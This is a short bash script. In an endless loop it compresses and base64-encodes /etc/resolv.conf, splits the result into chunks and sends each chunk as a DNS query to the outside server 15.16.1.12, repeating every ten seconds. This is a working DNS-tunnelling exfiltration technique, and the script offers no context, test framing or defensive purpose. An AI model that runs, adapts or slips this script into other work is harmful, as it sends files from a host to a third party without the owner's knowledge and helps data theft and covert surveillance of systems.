#!/bin/bash

while [[ true ]]; do
  #execute shell script
  f=/etc/resolv.conf;s=4;b=57;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g";echo -e "\n=end=");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i;."; c=$(($c+1)); else echo -ne "\n$i;."; c=1; fi; done ); do dig @15.16.1.12 `echo -ne $r$f|tr "+" "*"` +short; done
  sleep 10
done

